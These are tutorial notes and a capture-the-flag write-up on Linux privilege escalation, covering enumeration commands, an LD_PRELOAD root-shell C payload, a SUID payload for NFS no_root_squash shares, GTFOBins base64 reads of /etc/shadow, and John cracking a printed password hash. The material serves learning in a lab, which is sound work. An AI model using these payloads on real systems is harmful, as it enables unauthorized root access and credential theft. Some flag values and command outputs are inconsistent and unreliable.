# Linux Privilege Escalation
----

### What does "privilege escalation" mean?

- **At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.**


### Approach

- **`hostname` command will give you the hostnames of the target machine**
    - **In some cases, it can provide information about the target system’s role within the corporate network**

```sh
$ hostname
wade7363
```
- **`uname -a` command will help to find info about the kernel**
    - **It will be very useful to find kernel related vulnerabilities**

```sh
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

- **`/proc/version` command will help us to find system processes**
    - **Sometimes to check the version GCC or process like this we can use it**

- **`/etc/issue` command will help us to find more info about the OS**

- **`ps` command will help you to see the running process of the current shell**
    - **`ps -A` View all running processes**
    - **`ps axjf` View process tree (see the tree formation until ps axjf is run below)**
    - **`ps aux` The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.**

- **`env` will help me to find environment variable**
```sh
$ env 	
MAIL=/var/mail/karen
USER=karen
SSH_CLIENT=10.17.78.135 58854 22
HOME=/home/karen
SSH_TTY=/dev/pts/1
QT_QPA_PLATFORMTHEME=appmenu-qt5
LOGNAME=karen
TERM=xterm-256color
XDG_SESSION_ID=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/
SSH_CONNECTION=10.17.78.135 58854 10.10.50.223 22
```
- **`sudo -l` command can be used to list all commands your user can run using sudo.**

- **`id` command will give us basic info about user's privilege level**
- **`/etc/passwd` file can be an easy way to discover users on the system.**
    - **For having data in a bruteforce style list we can do  `cat /etc/passwd | cut -d ":" -f 1`**

- **`netstat` command can be used with several different options to gather information on existing connections.**
    - **`netstat -a`: shows all listening ports and established connections.**
    - **`netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.**
    - **`netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be    used with the “t” option to list only ports that are listening using the TCP protocol (below)**

- **`find` command will help you to find files or anything**
    - **`find . -name flag1.txt`: find the file named “flag1.txt” in the current directory**
    - **`find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory**
    - **`find / -type d -name config`: find the directory named config under “/”**
    - **`find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)**
    - **`find / -perm a=x`: find executable files**
    - **`find /home -user frank`: find all files for user “frank” under “/home”**
    - **`find / -mtime 10`: find files that were modified in the last 10 days**
    - **`find / -atime 10`: find files that were accessed in the last 10 day**
    - **`find / -cmin -60`: find files changed within the last hour (60 minutes)**
    - **`find / -amin -60`: find files accesses within the last hour (60 minutes)**
    - **`find / -size 50M`: find files with a 50 MB size**

    - **`find / -writable -type d 2>/dev/null` : Find world-writeable folders**
    - **`find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders**
    - **`find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders**

    - **`find / -perm -o x -type d 2>/dev/null` : Find world-executable folde**

    - **Find development tools and supported languages:**

        - **`find / -name perl`***
        - **`find / -name python`***
        - **`find / -name gcc`***

    - **Find specific file permissions:**

    - **Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.**

        - **`find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.** 

> #### When a file has the SUID (Set User ID) bit set, it means that the file, when executed, will run with the permissions of the file owner, not the user who is running it. For example, if a file is owned by the root user and has the SUID bit set, any user who executes that file will have root-level permissions while the file is running. This is often used for programs that need to perform tasks requiring higher privileges than those of the executing user.


### List of popular Linux enumeration tools with links to their respective Github repositories

- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker 

#### Getting Privilege Through exploits

- The Kernel exploit methodology is simple;

    - Identify the kernel version
    - Search and find an exploit code for the kernel version of the target system
    - Run the exploit 

**Real Life Tips 😁😁😁**
- Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit. 


# Leveraging LD_PRELOAD for Privilege Escalation

LD_PRELOAD is an environment variable used to specify shared libraries to be loaded before others. This feature can be exploited for privilege escalation if the "env_keep" option is enabled in the sudoers configuration. Here, we'll outline the steps to achieve this, write and compile the necessary C code, and run a program with sudo rights to escalate privileges.

## Steps for Privilege Escalation

1. **Check for LD_PRELOAD (with the env_keep option)**
2. **Write a simple C code compiled as a shared object (.so extension) file**
3. **Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file**

## C Code for Root Shell

The following C code will spawn a root shell:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Save this code in a file named `shell.c`.

## Compile the C Code

Compile the `shell.c` file into a shared object file using `gcc` with the following command:

```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

## Execute the Shared Object with Sudo

Run any program that your user can execute with sudo, using the LD_PRELOAD environment variable to specify the path to the shared object file:

```sh
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This command will result in a shell spawn with root privileges.

## Summary

1. **Check for LD_PRELOAD with env_keep:**
   - Verify the sudoers configuration for the env_keep option.
2. **Write C Code:**
   - Create a file `shell.c` with the provided code.
3. **Compile C Code:**
   - Use `gcc` to compile `shell.c` into `shell.so`.
4. **Run Program with Sudo:**
   - Execute a program with sudo, specifying the LD_PRELOAD variable.

By following these steps, you can leverage LD_PRELOAD to escalate privileges on a system where the env_keep option is enabled.

### SUID and SGID BIT
- `find / -type f -perm -04000 -ls 2>/dev/null`
- This command will check which files has suid bit

- Then check any files and find its shell.

#### Tips 
- Suppose you want to find the vulnerabilities in base64
- From `GITFOBINS` you can find its exploit

```sh
sudo install -m =xs $(which base64) .

LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```
- For this we have to change some file names
```sh
LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode
```
- This will give us the normal user permission
- Even we can see the elements of a file which has the root permission via this commands
```sh
LFILE=/home/ubuntu/flag3.txt
/usr/bin/base64 "$LFILE" | base64 --decode
```

### Capabilities
- **Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.The capabilities man page provides detailed information on its usage and options.**

- `getcap -r / 2>/dev/null` 
- By this you can check how many capabilities are there
- Then finding its exploit you can rock it!

### Cronjob

- The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

- Find if there is any shell exits in the cronjob or not.
- **If there is a file in the cronjob but that doesn't exits it simply means the admin deleted the file but forget to remove it from cronjob. In that particular case we can create a file of that name and get the root because the same name file has been given the root privilege**

- Find a reverse shell of your choice and rock it!

#### TIPS
- `cat /etc/shadow` this command will help you to find passwords

### PATH
- **If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).**

- **To Find Writeable - `find / -writable 2>/dev/null`**
- **`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`**
    - We have added “grep -v proc” to get rid of the many results related to running processes.
- **To Add Folder into PATH: `export PATH=/tmp:$PATH`**
- **After adding the /tmp to environmental variable it means if you run any file which has a root permission  will find the file into the /tmp folder**
- **Now we have to find out a script that has root permission**
- **After changing the script we can run it and it will run into the /tmp folder if the requirements matched!**

![alt text](image.png)

### NFS (Network File System)
- **If the `Network File System` is not properly configured then a privesc could happen there**
- **NFS is a protocol used to allow a system to share directories and files with others over a network.**
- **NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.**

#### Theory Behind NFS
- **Normally NFS provides `nfsnobody`(if it is enabled) it means that if a root user try to force root privilege to the files of NFS the `nfsnobody` will decrement the users privilege to a less powerful situation so that the user can't change or do something big with the NFS**
- **if the `no_root_squash` is enabled it means the root user can keep all the power**
- **If the NFS share is writable, the attacker can create a special file (an executable) with a special permission called the SUID bit. When this file is run, it acts with the privileges of the file's owner—root in this case.**
- **If the `no_root_squash` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.**

#### Process
- **`showmount -e <target-ip>` this command will show that how many ways/directories/paths you can mount your machine with the target to avoid permissions**
- **`mount -o rw <target-ip>:/<directory from showmount> <directory you want to mount>`**

    - **Example: `mount -o rw 10.10.56.220:/tmp /tmp/backupsonattackermachine`**

- **Prepare a payload for the exploitation which will have `+xs` permission**

**Payload:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main (void) {
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	return 0;

}
```
- **OR you can use msfvenom to create payloads**

### Capstone Challenge

> ### flag2.txt : `THM-168824782390238`

- I'm Approaching it because I found `SUID bit` for `base64`
```sh
[missy@ip-10-10-1-102 home]$ ls
leonard  missy  rootflag
[missy@ip-10-10-1-102 home]$ cd rootflag/
bash: cd: rootflag/: Permission denied
[missy@ip-10-10-1-102 home]$ LFILE=/home/rootflag/flag2.txt
[missy@ip-10-10-1-102 home]$ which base64
/usr/bin/base64
[missy@ip-10-10-1-102 home]$ /usr/bin/base64 "$LFILE" | base64 --decode
THM-168824782390238

```
> ### flag1.txt : `THM-168824782390238

- Same approach

```sh
[leonard@ip-10-10-1-102 home]$ LFILE=/home/missy/
[leonard@ip-10-10-1-102 home]$ /usr/bin/base64 "$LFILE" | base64 --decode
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
```
- I used hashkiller website for that

#### Using John

```sh
└─$ john missy                                                 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Password1        (?)     
1g 0:00:00:19 DONE 2/3 (2024-08-09 20:49) 0.05249g/s 194.8p/s 194.8c/s 194.8C/s skeeter..Password1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                      
```
- Now getting into missy
```sh
[leonard@ip-10-10-1-102 home]$ su missy
Password: 
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LANG = "C.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
[missy@ip-10-10-1-102 home]$ ls   
leonard  missy  rootflag
[missy@ip-10-10-1-102 home]$ cd missy/
[missy@ip-10-10-1-102 ~]$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  perl5
[missy@ip-10-10-1-102 ~]$ cd Documents/
[missy@ip-10-10-1-102 Documents]$ ls
flag1.txt
[missy@ip-10-10-1-102 Documents]$ cat flag1.txt 
THM-42828719920544

```